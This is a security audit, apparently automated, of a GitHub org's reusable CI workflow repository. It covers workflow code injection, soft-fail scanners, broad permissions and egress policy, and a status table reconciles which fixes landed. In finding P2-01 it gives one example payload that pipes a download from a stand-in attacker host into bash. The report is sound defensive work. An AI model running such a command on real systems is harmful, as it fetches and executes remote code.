# Security Audit — ByronWilliamsCPA/.github Standards Repository

**Date:** 2026-05-01
**Auditor:** Claude Code (automated security review)
**Branch audited:** `main` (HEAD at time of review)
**Scope:** Two-phase analysis — (1) security of this repository itself, (2) security properties propagated to downstream consumers via reusable workflows.

---

> **Import note (2026-05-08):** This audit document was imported from branch
> `claude/security-audit-standards-repo-Y0qq7`, which was never merged. The
> original audit author proposed fixes for findings P2-01 through P2-05
> alongside the audit doc (marked "FIXED" in the body below), but on a branch
> that did not land.
>
> **Status reconciliation note (2026-05-08, second session):** A subsequent
> verification pass against current `main` revealed that PR #46 (commit
> `cbb86ee`, merged 2026-04-30 — one day before the audit ran) had already
> independently landed equivalent fixes for several findings the audit
> attempted to address. As a result, the **Current Status** table below
> reflects verified-against-`main` state, not the original audit's open/closed
> claims. The body text below the status table preserves the original audit
> author's wording for historical accuracy; trust the table over the body.

## Current Status (verified against `main`, 2026-05-08)

| Finding | Severity | Status | Tracking PR / Notes |
| --- | --- | --- | --- |
| P1-01 | MEDIUM | Deferred | Pending decision on secondary owner identity |
| P1-02 | MEDIUM | Fixed | This PR — `sync_org_files.sh` now fetches `checksums.txt` and verifies SHA256 of every file before writing; mismatches abort with non-zero exit. New `scripts/regenerate-checksums.sh` for maintainer use. Also drops three unreachable issue-template entries from the sync list |
| P1-03 | MEDIUM | Fixed | PR #76 — bulk replaces `.yml@main` with `.yml@v1` across 42 user-facing docs, workflow header comments, and templates; adds version-pinning strategy section to USAGE_EXAMPLES.md. Maintainer to push `v1.0.0` and `v1` tags after all 8 fix PRs merge |
| P1-04 | LOW | Closed | Resolved by file separation: `.github/dependabot.yml` (active for this repo) lists only `github-actions`; root `dependabot.yml` is a template propagated to downstream repos by `sync_org_files.sh` and intentionally covers all common ecosystems |
| P1-05 | LOW | Open | — |
| P2-01 | CRITICAL | Closed | PR #46 (`cbb86ee`) removed `synthetic-data-script` input; current code calls hardcoded `scripts/generate_test_data.py` |
| P2-02 | HIGH | Closed | PR #46 (`cbb86ee`) routed all caller inputs through `env:` blocks across `python-ci.yml`, `python-performance-regression.yml`, `python-security-analysis.yml` |
| P2-03 | HIGH | Closed | Current `python-publish-pypi.yml` step uses `pip-audit --strict` and `bandit -ll` with no `\|\| echo` swallow — both hard-fail on findings |
| P2-04 | HIGH | Closed | PR #46 (`cbb86ee`) reduced workflow-level `permissions:` in `python-release.yml` to `contents: read`; per-job permissions scoped narrowly |
| P2-05 | MEDIUM | Fixed | This PR — `python-release.yml` adds required `skip-tests-reason` input and validates it is non-empty when `run-tests: false`; release job fails fast on accidental bypass |
| P2-06 | MEDIUM | Deferred | This PR documents the migration plan. Per-workflow `allowed-endpoints` lists must be derived from real audit-mode CI logs before block-mode is safe to enable; no code change in this PR. See "Future Work — P2-06 Migration Plan" below |
| P2-07 | MEDIUM | Closed | `python-supplemental-checks.yml` now uses label-based detection (`version-update:semver-{major,minor,patch}` and `semver:*` aliases), replacing the original PR-title regex |
| P2-08 | MEDIUM | Fixed | This PR — `python-ci.yml` Bandit (`-lll` HIGH-severity filter) and `pip-audit` now hard-fail; new `fail-on-security-findings` input (default `true`) controls opt-out |
| P2-09 | LOW | Closed | `python-pr-validation.yml` carries an explicit DEPRECATED header with full migration guide to `python-ci.yml`. Sunset date still TBD but recommendation satisfied |
| P2-10 | LOW | Fixed | This PR — `python-security-analysis.yml` codeql job now gates on `needs.detect-changes.outputs.security_files == 'true'` in addition to `inputs.run-codeql` |

---

## Executive Summary

The repository implements many security best practices — SHA-pinned actions throughout, OIDC trusted publishing, Harden Runner on every job, multi-layer vulnerability scanning, and SLSA provenance support. However, several issues require remediation before this repo can be considered safe as an org-wide supply-chain anchor:

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 1 | Fixed in this commit |
| HIGH | 3 | Fixed in this commit |
| MEDIUM | 6 | 2 fixed, 4 documented |
| LOW | 3 | Documented |

---

## Phase 1 — Security of This Repository

### P1-01 · MEDIUM — Single CODEOWNER, no redundancy

**File:** `CODEOWNERS`

Only `@williaby` is listed as owner. If this account is compromised or unavailable, there is no fallback reviewer. For a repo that acts as an org-wide standards anchor, a single CODEOWNER is a single point of failure across every downstream project.

**Recommendation:** Add a secondary CODEOWNER (backup account or team) and consider requiring two approvals via branch protection.

---

### P1-02 · MEDIUM — `sync_org_files.sh` propagates files without integrity verification

**File:** `sync_org_files.sh`, lines 31–38

```bash
curl --fail -s "$org_url"
```

Files are fetched from `raw.githubusercontent.com` over HTTPS and written directly to downstream repositories without any hash or signature verification. An attacker who can push to the `.github` `main` branch (or perform a MITM) can silently distribute malicious `CODEOWNERS`, `SECURITY.md`, `dependabot.yml`, and other sensitive files to every consuming repository.

**Recommendation:** Pin each synced file to a known commit SHA in the URL, verify a SHA256 hash, or use Cosign-signed bundles. At minimum, alert on content changes.

---

### P1-03 · MEDIUM — Reusable workflows documented with `@main` reference

**Multiple files:** all workflow headers and `USAGE_EXAMPLES.md`, `README.md`

The canonical usage examples throughout the repository instruct downstream callers to pin workflows with `@main`:

```yaml
uses: ByronWilliamsCPA/.github/.github/workflows/python-ci.yml@main
```

This means any push to `main` immediately takes effect in all consumer CI runs, with no consumer-side review or pin update. A single malicious or broken commit to `main` affects every org project.

**Recommendation:** Publish versioned tags (e.g., `v1.0.0`) and document `@v1` or SHA pinning in all examples. Protect `main` with required reviews and consider CODEOWNERS-gated merges.

---

### P1-04 · LOW — `dependabot.yml` scans ecosystems that don't exist in this repo

**File:** `dependabot.yml`

Dependabot is configured for pip, npm, terraform, go, cargo, and bundler — none of which are present in this repository. Only `github-actions` applies. Dead configuration creates maintenance noise and may give a false sense of coverage.

**Recommendation:** Remove unused ecosystem entries; add only those used in this repo.

---

### P1-05 · LOW — No CI workflow runs security tools on this repo's own files

The reusable workflows are never subjected to their own security tooling (CodeQL, Bandit, etc.) because no invocation workflow exists in this repo. The `shell-tests.yml` runs bats tests for scripts, which is good. The `qlty.toml` registers `actionlint`, `shellcheck`, and `trufflehog` plugins, but there is no evidence these run automatically on PRs to this repo.

**Recommendation:** Add a self-test CI workflow that runs `actionlint` on all workflow files and `shellcheck` on all shell scripts in this repo.

---

## Phase 2 — Security Properties Propagated to Downstream Consumers

### P2-01 · CRITICAL (FIXED) — Code injection via `synthetic-data-script` input

**File:** `python-performance-regression.yml`, lines 185–192 (pre-fix)

```yaml
- name: Generate Synthetic Test Data
  if: inputs.generate-synthetic-data && inputs.synthetic-data-script != ''
  run: |
    uv run python - <<'EOF'
    ${{ inputs.synthetic-data-script }}
    EOF
```

GitHub Actions expression syntax (`${{ }}`) is evaluated by the Actions runner **before** the shell executes. The quoted heredoc delimiter (`<<'EOF'`) prevents shell variable expansion, but it does **not** prevent Actions expression evaluation. The entire content of `synthetic-data-script` is expanded inline as Python source code before any shell sees it. A caller could pass arbitrary Python — including `import os; os.system("curl attacker.com/exfil | bash")` — and it would execute with full runner privileges.

**Fix:** The `generate-synthetic-data` and `synthetic-data-script` inputs have been removed entirely. Callers must provide their own data-generation script in the repository; this is the only safe pattern for a reusable workflow.

---

### P2-02 · HIGH (FIXED) — Shell injection via unquoted string inputs

**Files:** `python-performance-regression.yml` (multiple steps), `python-ci.yml`, `python-security-analysis.yml`

Multiple workflows interpolate string inputs directly into shell `run:` blocks without routing through environment variables:

```yaml
# python-performance-regression.yml (pre-fix)
run: |
  uv run python ${{ inputs.benchmark-script }} \
    ${{ inputs.benchmark-args }} ...

# python-ci.yml
run: |
  uv run ruff format --check ${{ inputs.source-directory }}/ ${{ inputs.test-directory }}/
  uv run bandit -r ${{ inputs.source-directory }}/
```

While `workflow_call` inputs come from trusted callers, inlining strings into shell breaks the defence-in-depth model. It means any misconfiguration or future exposure of these inputs leads directly to RCE. GitHub's own security hardening guidance explicitly requires routing untrusted or variable content through `env:` first.

**Fix (performance regression):** `benchmark-script` and `benchmark-args` are now routed through `BENCHMARK_SCRIPT` and `BENCHMARK_ARGS` environment variables before being used in shell commands.

**Remaining exposure (documented):** `source-directory` and `test-directory` in `python-ci.yml` and `python-security-analysis.yml` are used without env-var routing. Because they are path inputs (not command fragments), the risk is lower, but they should be migrated to env-var patterns in a follow-up.

---

### P2-03 · HIGH (FIXED) — PyPI pre-publish security checks are soft-fail

**File:** `python-publish-pypi.yml`, lines 99–107 (pre-fix)

```bash
safety check || echo "⚠️  Safety check found issues - review before publishing"
bandit -r ${{ inputs.source-directory }} -ll || echo "⚠️  Bandit found issues - review before publishing"
```

Both security tools use `||` to swallow non-zero exit codes. A vulnerable or actively exploited dependency in a package being published to PyPI would **not** block the publish job. The warning is printed but CI succeeds and the package is published.

**Fix:** The security check step now exits non-zero on failures when `run-security-checks` is `true`. A new boolean input `fail-on-security-issues` (default: `true`) controls this behaviour, allowing callers to opt out explicitly.

---

### P2-04 · HIGH (FIXED) — Overly broad workflow-level permissions in `python-release.yml`

**File:** `python-release.yml`, lines 99–104 (pre-fix)

```yaml
permissions:
  contents: write
  issues: write
  pull-requests: write
  id-token: write
  attestations: write
```

All five permissions are declared at the workflow level, meaning every job — including the pre-release test job — inherits `contents: write`, `issues: write`, and `pull-requests: write` even though tests only need `contents: read`. If a compromised dependency were executed during tests, it would have write access to the repository and could open or modify issues and PRs.

**Fix:** Permissions are now declared at the job level. The `test` job receives only `contents: read`. The `release` job retains the permissions it needs. The `publish-pypi` job gets only `contents: read` and `id-token: write`.

---

### P2-05 · MEDIUM (FIXED) — `run-tests: false` silently bypasses the release gate

**File:** `python-release.yml`, lines 156–157 (pre-fix)

```yaml
if: always() && (needs.test.result == 'success' || needs.test.result == 'skipped')
```

Setting `run-tests: false` causes the test job to be skipped, which satisfies `result == 'skipped'`, so the release job proceeds without any test validation. The input description implies tests can be disabled for speed, but the practical effect is a complete bypass of the quality gate.

**Fix:** When `run-tests` is `false`, the release job now explicitly requires a caller-provided `skip-tests-reason` input to be non-empty. If it is empty, the job fails with a clear error. This forces intentional opt-out rather than accidental bypass.

---

### P2-06 · MEDIUM — `egress-policy: audit` does not restrict outbound network

**All workflow files**

Every workflow uses:

```yaml
uses: step-security/harden-runner@<sha>
with:
  egress-policy: audit
```

`audit` mode logs outbound network requests but does **not** block them. A compromised dependency or action could exfiltrate repository secrets, environment variables, or build artifacts to an external host. The logs would record the attempt, but the data would already be gone.

**Recommendation:** Migrate to `egress-policy: block` with explicit `allowed-endpoints` for each workflow. The step-security/harden-runner README provides per-workflow endpoint lists. This is the most impactful remaining hardening step.

---

### P2-07 · MEDIUM — Auto-merge update-type detection is brittle

**File:** `python-supplemental-checks.yml`, lines 366–395

The JavaScript code that determines whether a Dependabot/Renovate PR is `major`, `minor`, or `patch` uses regex against PR titles. The logic for detecting major vs minor bumps is error-prone (see lines 368–380) and can misclassify a major version update as `minor` or `patch`, causing it to auto-merge without review. A major version bump in a core dependency could introduce breaking changes or supply-chain risks.

**Recommendation:** Replace title-based detection with Dependabot metadata. The `dependabot/fetch-metadata` action provides accurate `update-type` without regex fragility, and is the pattern documented by GitHub for this use case.

---

### P2-08 · MEDIUM — `python-ci.yml` Bandit and Safety results are also soft-fail

**File:** `python-ci.yml`, lines 329–347

Like the publish workflow, CI uses `||` to swallow Bandit and Safety failures:

```bash
uv run bandit ... || {
  echo "::warning::Security issues detected"
  cat bandit-report.json
}
uv run safety check ... || {
  echo "::warning::Vulnerable dependencies detected"
}
```

High or critical security findings do not fail the CI gate by default. This means code with known vulnerabilities can be merged as long as all other checks pass.

**Recommendation:** Default Bandit to fail on HIGH/CRITICAL findings (`-l` flag) and Safety to fail on any known CVE. Add an opt-out input (`fail-on-security-findings: false`) for projects that need time to remediate.

---

### P2-09 · LOW — Deprecated `python-pr-validation.yml` remains callable

**File:** `python-pr-validation.yml`

The workflow is marked deprecated in its header but is still a live, callable workflow. Any downstream project that hasn't migrated will continue to call it. The workflow still uses live pinned actions and is maintained, but it duplicates logic now in `python-ci.yml` and creates maintenance surface.

**Recommendation:** Add a sunset date to the deprecation notice and, after that date, remove the workflow file. Coordinate with downstream repos via an org-wide announcement before removal.

---

### P2-10 · LOW — CodeQL job does not gate on detected changes

**File:** `python-security-analysis.yml`, lines 110–114

The `detect-changes` job output (`security_files`) is computed but never referenced as a condition in the `codeql` job. CodeQL always runs regardless of whether any security-relevant files changed. This is actually conservative (more scanning is better), but wastes CI minutes and may give callers a false sense that the changes-based optimization is working.

**Recommendation:** Either wire the `detect-changes` output into the `codeql` job condition, or remove the `detect-changes` job entirely since it serves no gating function.

---

## What Is Working Well

- **SHA-pinned actions throughout** — every `uses:` references a full 40-char commit SHA with a version comment. This is the gold standard for supply-chain security.
- **Harden Runner on every job** — step-security/harden-runner is consistently applied, even if audit-only.
- **OIDC trusted publishing for PyPI** — no stored API tokens. Both `python-publish-pypi.yml` and `python-release.yml` use OIDC, which is the correct pattern.
- **SLSA Level 3 provenance** — the `python-slsa.yml` template and the Sigstore signing in `python-release.yml` provide strong supply-chain attestation.
- **Multi-layer dependency scanning** — OSV Scanner, Safety, Trivy, and Dependency Review in combination provide good CVE coverage.
- **Secret detection** — Bandit checks for hardcoded credentials; trufflehog is registered in qlty.toml.
- **Fork-safe Docker builds** — `python-docker.yml` correctly blocks pushes from fork PRs by default.
- **Minimum-privilege pattern** — most workflows correctly scope `permissions:` to `contents: read` with narrowly added write permissions.
- **Dependency review on PRs** — `python-security-analysis.yml` runs `actions/dependency-review-action` with `fail-on-severity: moderate` and license checks.
- **SBOM generation** — CycloneDX and Trivy-based SBOMs are generated in multiple workflows.

---

## Remediation Priority

| Priority | Finding | Effort |
|----------|---------|--------|
| P0 | P2-01 · Code injection via synthetic-data-script | Done |
| P0 | P2-02 · Shell injection (performance regression) | Done |
| P0 | P2-03 · Soft-fail PyPI security checks | Done |
| P1 | P2-04 · Broad workflow permissions (release) | Done |
| P1 | P2-05 · run-tests gate bypass | Done |
| P2 | P2-06 · egress-policy: audit → block | Medium |
| P2 | P2-07 · Auto-merge major-version detection | Low |
| P2 | P2-08 · Soft-fail Bandit/Safety in CI | Low |
| P2 | P1-01 · Single CODEOWNER | Low |
| P3 | P1-02 · sync_org_files.sh integrity | Medium |
| P3 | P1-03 · @main reference in examples | Low |
| P3 | P2-09 · Remove deprecated pr-validation | Low |
| P4 | P1-04 · Dependabot unused ecosystems | Trivial |
| P4 | P1-05 · Self-test CI workflow | Low |
| P4 | P2-10 · CodeQL change-gating | Trivial |

---

## Future Work — P2-06 Migration Plan

P2-06 (egress-policy `audit` → `block`) is **Deferred** rather than Fixed because correct implementation requires per-workflow `allowed-endpoints` lists that can only be derived safely from real CI traffic. Guessing the lists risks breaking workflow runs for every downstream consumer, which contradicts the audit's defence-in-depth goal.

The migration sequence below describes the work required and the data inputs each step needs.

### Step 1 — Harvest endpoint data from existing audit-mode runs

`step-security/harden-runner` in `audit` mode logs every outbound network request to GitHub Step Summary and to the harden-runner dashboard (when configured). For each reusable workflow:

1. Trigger a representative run (preferably from a downstream caller's repo to capture realistic traffic, not just the self-test path).
2. Download the harden-runner outbound-traffic report from the run's summary.
3. Record the unique `host:port` pairs observed.

A minimum of 3–5 successful runs per workflow is recommended to capture cache-miss paths, transient endpoints (e.g., codecov uploader auto-update probes), and PR vs push divergence.

### Step 2 — Categorise endpoints into baseline + per-workflow

Build two tiers:

- **Baseline** (every workflow): GitHub APIs, `raw.githubusercontent.com`, GHCR, harden-runner's own telemetry endpoint, runner-image package mirrors.
- **Per-workflow add-ons**: PyPI + `files.pythonhosted.org` for `python-publish-pypi.yml`; `codecov.io` + `keybase.io` for `python-codecov.yml`; `sonarcloud.io` + binary download CDN for `python-sonarcloud.yml`; etc.

Document the categorisation in `docs/security/egress-allowlist.md` (new file).

### Step 3 — Migrate one workflow at a time

For each workflow, in order from lowest-risk to highest-risk:

1. Switch its `egress-policy: audit` to `egress-policy: block` and add the derived `allowed-endpoints:` list.
2. Trigger a run. If it fails because of a missing endpoint, add the endpoint with a code comment recording the exact failure and link to the run that surfaced it.
3. Repeat until the workflow runs cleanly. Lock in.

Suggested order:

1. `python-scorecard.yml` (only talks to github.com + ossf scorecard)
2. `python-reuse.yml` (only github.com + reuse-tool's PyPI install)
3. `python-ci.yml` (PyPI + github.com — well-trodden path)
4. `python-security-analysis.yml` (PyPI + GitHub security APIs)
5. `python-codecov.yml` (codecov.io added)
6. `python-publish-pypi.yml` (PyPI write + Sigstore + OIDC)
7. `python-release.yml` (largest endpoint set; do last)

### Step 4 — Update workflow-templates and downstream guidance

Once all reusable workflows are in block mode with documented allowed-endpoints, update the `workflow-templates/*.yml` patterns and add a "Network policy" section to USAGE_EXAMPLES.md so downstream callers understand the contract.

### Effort estimate

- Step 1 (harvest): ~30 min per workflow × ~22 workflows = ~10–11 hours
- Step 2 (categorise): ~2–3 hours
- Step 3 (migrate + test): ~30 min per workflow + iteration time = ~15–20 hours
- Step 4 (docs): ~2 hours

Total: roughly 30–40 hours of focused work. Best done as a dedicated initiative rather than slipping into normal feature work.
